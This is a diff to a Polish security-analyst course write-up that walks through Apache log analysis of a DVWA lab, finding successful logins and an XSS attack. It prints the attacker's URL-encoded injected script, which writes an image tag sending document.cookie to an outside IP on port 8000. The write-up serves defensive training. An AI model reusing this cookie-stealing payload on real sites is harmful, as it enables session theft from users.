@@ -21,8 +21,9 @@ Sprawdzamy sobie pierwsze 20 pozycji za pomocą head, by zweryfikować jaki mamy
 
 ![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/3-image.png)
 
-Odp. **Format: *apache combined* - na końcu ma Referrer i User-Agent w cudzysłowaćh**
-https://httpd.apache.org/docs/2.4/logs.html
+Odp. **Format: *apache combined* - na końcu ma Referrer i User-Agent w cudzysłowach**
+
+htxps://httpd.apache.org/docs/2.4/logs.html
 
 ![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/4-image.png)
 
@@ -83,13 +84,13 @@ Grepujemy User-Agentów, które zawierają informacje o przeglądarce. Robię to
 ![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/12-image.png)
 
 Widać tutaj **dwa momenty**:
-dvwa.com:80 30.13.3.7 - - [24/May/2022:04:13:57 +0200] "POST /login.php HTTP/1.1" 302 337 "http://dvwa.com/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
-dvwa.com:80 30.13.3.7 - - [24/May/2022:04:13:57 +0200] "GET /index.php HTTP/1.1" 200 2894 "http://dvwa.com/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
+dvwa.com:80 30.13.3.7 - - [24/May/2022:04:13:57 +0200] "POST /login.php htxp/1.1" 302 337 "htxp://dvwa[.]com/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
+dvwa.com:80 30.13.3.7 - - [24/May/2022:04:13:57 +0200] "GET /index.php htxp/1.1" 200 2894 "htxp://dvwa[.]com/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
 
 Oraz 
 
-dvwa.com:80 30.13.3.7 - - [24/May/2022:05:01:49 +0200] "POST /login.php HTTP/1.1" 302 337 "http://dvwa.com/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
-dvwa.com:80 30.13.3.7 - - [24/May/2022:05:01:49 +0200] "GET /index.php HTTP/1.1" 200 2894 "http://dvwa.com/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
+dvwa.com:80 30.13.3.7 - - [24/May/2022:05:01:49 +0200] "POST /login.php htxp/1.1" 302 337 "htxp://dvwa[].com/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
+dvwa.com:80 30.13.3.7 - - [24/May/2022:05:01:49 +0200] "GET /index.php htxp/1.1" 200 2894 "htxp://dvwa[.]com/login.php" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
 
 W przefiltrowanym ruchu widzimy dwa żądania **POST /login.php,** po których pojawia się przekierowanie `302`i wejście na `index.php`, co zwykle oznacza udane zalogowanie.
 
@@ -114,6 +115,7 @@ do 24/May/2022:06:31:10 +0200 UTC**
 3. **W jakim for(ma)cie jest plik logów oraz, którego pliku jest kopią?** 
 
 ![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/15-image.png)
+
 **format apache combined - kopia access.log**
 
 4. Ile i jakie adresy IP wysyłały żądania do aplikacji webowej w analizowanym zakresie czasu? 
@@ -149,7 +151,7 @@ Szukamy "wstrzyknięcia" do strony własnego Javascriptu, bazując po słowie "s
 
 ![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/19-image.png)
 
-**Atakujący wstrzyknął: "3Edocument.write%28%27%3Cimg+src%3D%22http%3A%2F%2F30.13.3.7%3A8000%2Fcollect.gif%3Fcookie%3D%27+%2B+document.cookie+%2B+%27%22+%2F%3E%27%29%3C%2Fscript%3"**
+**Atakujący wstrzyknął: "3Edocument.write%28%27%3Cimg+src%3D%22htxp%3A%2F%2F30.13.3.7%3A8000%2Fcollect.gif%3Fcookie%3D%27+%2B+document.cookie+%2B+%27%22+%2F%3E%27%29%3C%2Fscript%3"**
 
 **Odp. XSS.**
 
@@ -166,8 +168,10 @@ Bazując na poprzednim screenie: możemy odszyfrować wiadomość w Cyberchefie.
 ![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/20-image.png)
 
 Powyższy kod wskazuje nam takie rzeczy jak
-- odczytywanie document.cookie 
+- odczytywanie document.cookie
+
 (https://webref.pl/arena/html5/domhtml5_document_cookie.html)
+
 - stworzenie elementu (document.write) - czyli obrazka i wysyłanie żadania na serwer atakującego, cookie= dokleja nam tutaj ciasteczka ofiary.
   
 **Odp. Jeśli atak by się powiódł, atakujący uzyskałby cookies użytkownika dostępne z JS.**
@@ -191,6 +195,7 @@ Odp. **24/May/2022:08:11:21 +0200 do 24/May/2022:09:52:03 +0200**
 ![alt](/courses/szkola-security/secuirty-analyst/siem/analiza-logow-cli-zadania-szkola/zadania-szkola/Attachments/25-image.png)
 
 **Widzimy tu referer - np. "htxp://dvwa[.]com/vulnerabilities/fi/?page=include.php"**
+
 https://www.ibm.com/docs/en/webmethods-integration/wm-integration-server/11.1.0?topic=log-combined-format
 
 **Odp. apache combined - Other_vhost_access.log**
